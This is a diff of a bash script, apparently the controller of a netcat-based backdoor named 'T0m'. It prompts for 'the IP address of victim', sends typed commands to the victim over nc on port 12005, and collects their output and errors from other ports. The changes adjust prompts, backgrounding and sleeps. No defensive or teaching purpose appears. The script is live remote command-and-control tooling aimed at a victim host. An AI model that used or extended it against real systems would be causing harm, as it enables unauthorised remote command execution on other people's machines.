@@ -1,11 +1,8 @@
 #!/bin/bash
 echo "[S] T0m running"
 
-echo -n "What is the IP address of victim?(localhost) :"
-read ip
-if [[ "$ip" == "" ]] ; then
-	ip="localhost"
-fi
+echo -e "What is the IP address of victim?"
+read -p ":" ip
 
 outputport=12005
 inputport=12006
@@ -72,18 +69,16 @@ do
 	if [ $usr -eq 3 ];then
 		break
 	elif [ $usr -eq 2 ]; then
-		clear
 		cat "$inputfile"	
 		cat "$errorfile"
 	elif [ $usr -eq 1 ]; then
 		echo "[S] Please input the command you want to execute!"
 		read -p "[S] :" command
 		echo "[S] Sending $command, to $ip on $outputport"
-		echo "$command" | nc "$ip" "$outputport"
+		echo "$command" | nc "$ip" "$outputport" &
 		echo "[S] Command sent!"
 		sleep 2 && pkill -P $$
 		nc $ip "$inputport" > "$inputfile" &
-		sleep 2 && pkill -P $$
 		nc $ip "$errorport" > "$errorfile" &
 		sleep 2 && pkill -P $$
 	else
@@ -93,4 +88,6 @@ done
 
 
 exit 0
+
+
 
